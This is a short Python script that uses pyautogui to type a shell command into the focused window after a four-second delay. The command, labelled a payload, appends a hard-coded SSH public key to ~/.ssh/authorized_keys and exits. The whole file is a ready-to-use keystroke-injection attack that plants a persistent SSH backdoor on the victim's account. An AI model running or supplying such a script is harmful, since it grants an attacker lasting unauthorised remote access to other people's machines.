import time
import pyautogui
time.sleep(4)
# NOTE payload is a raw string to prevent escape chars
payload = r"""echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3YCxLKDo6qz6CP33n68IbZGs5cZHnb9RZSJfBJIH9WC8jvm0AsKkSwaAecCKQ6VXf03ZHEmJ67QU8/6hNXy7l2eM7vrP09bT7cOKNlIfuzZTjWt2xMqZ5rY+oOHwiF0PEV02uZkBVvEUaEH5JDB5NzKI2ZPZy2oAM5lGmoTY1HBdp1AzliSMWLgiXLxMlCqfz4bzGZbA+FVuFMhs6nPzMfbXeR5hVD5k7/j3WnlU8Dd8N5NzZrPWJG25FfVM3kAt+wKSSNA3iDtVeFVeDtcEY92Ze6G2pJNL/BQLcNn9fy9FRSchODd/REcEBazB9hRA6qzZ+aiqFMIoa05ZKrScH" >> ~/.ssh/authorized_keys && exit
"""
pyautogui.typewrite(payload, interval=0.01)  # rate is adjustable, but it may mistype if too fast
